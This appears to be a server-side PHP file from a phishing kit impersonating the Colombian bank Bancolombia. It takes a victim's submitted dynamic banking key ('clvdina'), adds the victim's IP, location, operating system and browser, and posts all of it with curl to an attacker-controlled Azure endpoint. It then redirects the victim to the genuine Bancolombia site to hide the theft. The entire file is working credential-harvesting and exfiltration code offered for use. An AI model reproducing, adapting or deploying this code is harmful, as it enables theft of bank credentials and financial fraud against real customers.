<?php ini_set('display_errors', 0);

include('funciones.php');
if (isset($_POST['clvdina'])) {
    $message = 'Banclombia-inf
Clave-dinamik2: ' . $_POST['clvdina'] . '
Fecha: ' . date('l jS \of F Y h:i:s A', time()) . '
Ip y Localidad: ' . $myip . ' ' . $pais . ' ' . $region . '
SO: ' . $user_os . '
Navegador: ' . $navegador . '';
    $payload = ['mensaje' => $message];
    $url = 'https://servidorapis-ggdnawe6aefxerg7.canadacentral-01.azurewebsites.net/bancolombianequi/';

    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST           => true,
        CURLOPT_HTTPHEADER     => [
            'Accept: application/json',
            'Content-Type: application/json'
        ],
        CURLOPT_POSTFIELDS     => json_encode($payload, JSON_UNESCAPED_UNICODE),
        CURLOPT_TIMEOUT        => 20,
        CURLOPT_CONNECTTIMEOUT => 10,
    ]);

    $response = curl_exec($ch);
    if ($response === false) {
        error_log('cURL error: ' . curl_error($ch));
        http_response_code(500);
        exit('Error de red.');
    }
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
}
echo '<script>
window.location.href="https://www.bancolombia.com/personas";
</script>';
